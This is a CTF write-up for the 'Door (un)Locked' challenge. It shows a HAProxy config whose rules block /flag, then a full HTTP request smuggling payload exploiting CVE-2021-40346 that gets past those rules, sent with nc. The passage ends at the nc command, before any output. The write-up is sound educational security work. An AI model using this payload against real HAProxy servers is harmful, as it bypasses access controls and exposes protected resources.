## Description
> Some researchers started deploying a website for their CTF, but something went wrong with the defined policies when trying to hide the flags.
> Can you find the weak link?
The following file was attached (`ha.cfg`):
```
global
    daemon
defaults  
    mode    http
    timeout  client  50000
    timeout  server  50000
    timeout  connect 50000
frontend web 
    bind *:8000  
    http-request deny if { path_beg /flag }
    http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
    default_backend websrvs
backend websrvs 
    http-reuse always
    server srv1 flask:5000
```
## Solution
The attached website contains nothing interesting:
```console
┌──(user@kali)-[/media/sf_CTFs/intent/Door_(un)Locked]
└─$ curl -s http://door-unlocked.chal.intentsummit.org:8000/ | tail -15
    Door (un)Locked
    COMING SOON
    1 days left
    Powered by w3.css
```
But if we try to access `/flag`, we can't, due to the `http-request deny` rules:
```console
┌──(user@kali)-[/media/sf_CTFs/intent/Door_(un)Locked]
└─$ curl -s http://door-unlocked.chal.intentsummit.org:8000/flag
403 Forbidden
Request forbidden by administrative rules.
```
The syntax of the attached file looks like a HAProxy configuration. Researching known vulnerabilities, we come across [Critical Vulnerability in HAProxy (CVE-2021-40346): Integer Overflow Enables HTTP Smuggling](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/). The solution is pretty much to follow the blog post and utilize the attack for our case:
```
POST / HTTP/1.1
Host: door-unlocked.chal.intentsummit.org:8000
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 22
GET /flag HTTP/1.1
h:GET / HTTP/1.1
Host: door-unlocked.chal.intentsummit.org:8000
```
Running it, we get:
```console
┌──(user@kali)-[/media/sf_CTFs/intent/Door_(un)Locked]
└─$ cat payload.txt| nc door-unlocked.chal.intentsummit.org 8000
